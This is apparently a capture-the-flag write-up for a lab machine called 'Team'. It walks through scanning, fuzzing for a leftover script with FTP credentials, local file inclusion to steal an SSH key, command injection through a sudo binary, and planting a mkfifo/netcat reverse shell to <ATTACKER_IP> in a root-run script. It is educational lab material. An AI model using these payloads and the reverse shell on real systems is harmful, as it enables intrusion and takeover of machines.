# Enumeration

## \[+] 10.10.57.70 - team.thm

We will add the target IP address and a domain name to our `/etc/hosts` file. Using `sudo sh -c`, executes the entire command as a subshell as `root` where we will then use `echo` to create a new line with `\n` followed by our target IP and the domain name we give it.

```sh
sudo sh -c 'echo "\n10.10.57.70 team.thm" >> /etc/hosts'
```

Then `export` the IP address to the environment variable `RHOSTS` so I can use `$RHOSTS` instead of typing the IP address every time.

```sh
export RHOSTS=10.10.57.70
```

First, I run a quick scan with [rustscan](https://github.com/RustScan/RustScan) and a longer [nmap](https://nmap.org/) stealth scan with `-Pn` mode enabled which will treat all hosts as online which helps find other hosts that block ICMP packets:

```sh
rustscan -a $RHOSTS --ulimit 5000 -b 4500 -t 2000 --range 1-65535 -- -sC -sV
sudo nmap -v -Pn -sS -p- -A --min-rate=1000 -T4 $RHOSTS -oN nmap.txt
```

## \[+] Port 80 - HTTP

### \[-] team.thm

There isn't much here at first so let's try fuzzing for files and directories using [feroxbuster](https://github.com/epi052/feroxbuster) with this [wordlist](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/common.txt):

```sh
feroxbuster -u http://team.thm/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x json,txt,js,xml -s 200,301,302,403 -o p-80-www-ferox.txt
```

### \[-] team.thm/scripts/script.txt

Inside this file is a bash script with some comments from the developer:

```plaintext
#!/bin/bash
read -p "Enter Username: " REDACTED
read -sp "Enter Username Password: " REDACTED
echo
ftp_server="localhost"
ftp_username="$Username"
ftp_password="$Password"
mkdir /home/username/linux/source_folder
source_folder="/home/username/source_folder/"
cp -avr config* $source_folder
dest_folder="/home/username/linux/dest_folder/"
ftp -in $ftp_server <<END_SCRIPT
quote USER $ftp_username
quote PASS $decrypt
cd $source_folder
!cd $dest_folder
mget -R *
quit

# Updated version of the script
# Note to self had to change the extension of the old "script" in this folder, as it has creds in
```

The credentials from this script have been redacted, but the old version of the script is still on the server with a different extension, as mentioned in the comments.

We can use a fuzzer like [ffuf](https://github.com/ffuf/ffuf) to quickly search for the old bash script using this [extensions wordlist](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/raft-large-extensions.txt) where we will use the `FUZZ` keyword at the end of the filename "`script`":

```sh
ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-extensions.txt -u http://team.thm/scripts/scriptFUZZ -fc 301,302,403
```

### \[-] team.thm/scripts/script.old

Using [curl](https://linux.die.net/man/1/curl) we can print the contents of the file directly to the terminal where we will find the credentials to the FTP server in the old bash script:

```sh
curl team.thm/scripts/script.old
```

![01954e57e626d15ecf580f945940d084.png](/resources/2d9799dd2dd44fb4a7d475925492a1c4.png)

## Port 21 - FTP

Let's log into the FTP server using the credentials we just found using the [ftp](https://linux.die.net/man/1/ftp) command and enter the password when prompted:

```sh
ftp <USERNAME>@$RHOSTS
passive
ls -lah
```

![fd1970179885e8bfed821ba6bfd6a199.png](/resources/fcd21a0cf82f4bbea4e683f489648b1d.png)

We will find two interesting directories. The `.ssh/` directory might contain keys we can use and the `workshare/` directory is a user created directory that might contain sensitive information.

Let's explore `workshare/` first by running `cd workshare` then `ls -lah`. Inside we will find a text file, `New_site.txt` which we can download using the `get` command:

```sh
cd workshare
ls -lah
get New_site.txt
exit
```

![b0c84b23082b11e7a0b4ce66082a7afb.png](/resources/4e54782e12144e41bca5121fa14dd46e.png)

Inside the text file we will find a note about another subdomain and where to find SSH keys:

![b5b8a829506d8bc0193c063ade4f5115.png](/resources/5c8ab76d2d64462497f2bbd537eaf83d.png)

Before we can access the subdomain, we will need to add the `dev` subdomain to `/etc/hosts`:

```sh
sudo sh -c 'echo "\n10.10.57.70 dev.team.thm" >> /etc/hosts'
```

# Initial Foothold

### \[-] dev.team.thm

Here, we'll find a website that is under development with a link to a PHP script:

![0b597ad2f66c81a61f4d2ef578a86acd.png](/resources/b5787a0b88334f4bb930137754ade976.png)

### \[-] dev.team.thm/script.php?page=teamshare.php

It looks like `script.php` is being used to load `teamshare.php` via the `page` parameter:

![87284a7a4fdc780ac9096be401c97e89.png](/resources/455a621873884f5e9bf8d666ae940fc5.png)

Instead of loading `teamshare.php`, let's try Local File Inclusion (LFI) to browse other areas of the machine, like `/etc/passwd`:

```sh
curl -vvv dev.team.thm/script.php?page=../../../../../../etc/passwd
```

![0ebb7128c96e8d6bad2d7070f5d55770.png](/resources/7a08ec44bad1481595e9f2d0e2262e00.png)

Now that we know we can browse the machine via LFI, we can try to see if we can access the `/etc/ssh/sshd_config` file which might contain SSH keys:

```sh
curl -vvv dev.team.thm/script.php?page=/etc/ssh/sshd_config
```

Towards the end of the file we will find the SSH key for Dale Gyles:

![9fd5d1c17658acd3f780910fcd43b7ab.png](/resources/441428fb767543dfab9de3cea22b8c6e.png)

Highlight starting from `#-----BEGIN OPENSSH PRIVATE KEY-----` to `#-----END OPENSSH PRIVATE KEY-----` then save this to a text file and remove the `#` symbols. Next, use `chmod` to give the key proper permissions before connecting via SSH:

```sh
chmod 600 id_rsa
```

## Port 22 - SSH

### \[-] dale\@TEAM

We can use the [ssh](https://linux.die.net/man/1/ssh) command along with the `-i` flag to specify our SSH key file:

```sh
ssh -i id_rsa dale@team.thm
```

![b14fae0ec1c2ca803cdd18458bfc45dc.png](/resources/45803f6248094b01b930e58121385d7d.png)

The user flag is in `/home/dale/user.txt`:

```sh
ls -lah
cat /home/dale/user.txt
```

![8c0aa49ed4e2bd70d9c73f5b0b4ba837.png](/resources/b596ec19065f46289497c3dd1199bbcd.png)

# Privilege Escalation

### \[-] gyles\@TEAM

Also in the `/home/dale/` directory, we will find that the `.bash_history` file hasn't been cleared out. This file is a log of all the commands the user ran in the bash shell. One of the commands runs a custom binary, `admin_checks` with `sudo` privileges:

![9c9e1628f2476baaa7861154454824c0.png](/resources/3585f076a2e448ffb0bf86df03c5229e.png)

Using the `sudo -l` command we can check to see what the user `dale` can run as `sudo`:

![5a3821fa3d17610e28a74490164e68bc.png](/resources/28fddaa9c1554fa49e9a6006cc9aedec.png)

We can try to see what the binary is doing by running `cat` on it:

```sh
cat /home/gyles/admin_checks
```

![9eaf1f6e9003f2f4fa1e2b4850a2d6f5.png](/resources/1154f9b7894645609f544e5cdcc4d488.png)

When the script prompts the user to enter the `date` command and uses that output to save to the backup file. Instead of running the `date` command, since there is no input sanitization, we can use this binary to run our own commands under the context of the user `gyles` since we will be using `sudo`:

```sh
sudo -u gyles /home/gyles/admin_checks
gyles
id
```

![2d1779e012bbcaa937dc35116aa07f5b.png](/resources/5d5d4603579b4d8f8843a3e60b0b390e.png)

This time instead of running the `id` command, we will run the bash shell with the `-i` flag set to make the shell interactive:

```sh
sudo -u gyles /home/gyles/admin_checks
gyles
/bin/sh -i
```

![49f93d5b24f4b885bfaac619c1ddb38a.png](/resources/a914bee562f648e6a6ee8d515a26c370.png)

### \[-] root\@TEAM

Inside the `/home/gyles/` directory, we will find the `.bash_history` file has not been cleared on this account either. Inside the log, we will find multiple scripts the user created which runs as the root user since they were created using `sudo`:

![d31d87fcf8eddb8f99a15da0bb1991b9.png](/resources/cb6cae118f6841dd95eda3cfa335c688.png)

Using `ls -lah <FILENAME>` we can check the permissions of the scripts to see if we can overwrite them with our own:

```sh
ls -lah /usr/local/bin/main_backup.sh
```

![a5da721c812dbcab6343630eaf1e56a5.png](/resources/585fccadc0374973af5cfabbf993d99b.png)

Let's overwrite this file using our own bash script to execute a reverse shell. To make this easy, we can create the script on our attacking machine, convert it into base64 then copy the base64 string, decode it and save the file on the victim machine.

Create a new text file with the following code and save it as `main_backup.sh`:

```sh
#!/usr/bin/env bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <ATTACKER_IP> 4444 >/tmp/f
```

Then use the [base64](https://linux.die.net/man/1/base64) command to encode the file:

```sh
base64 -w 0 main_backup.sh
```

Start a Netcat listener:

```sh
nc -nvlp 4444
```

On the victim machine, run the following commands:

```sh
cd /usr/local/bin/
echo "<BASE64_STRING>" | base64 -d > main_backup.sh
```

After a minute or so we should have a connection from the victim machine as root on our Netcat listener:

We can find the root flag in `/root/root.txt`:

```sh
ls -lah /root
cat /root/root.txt
```
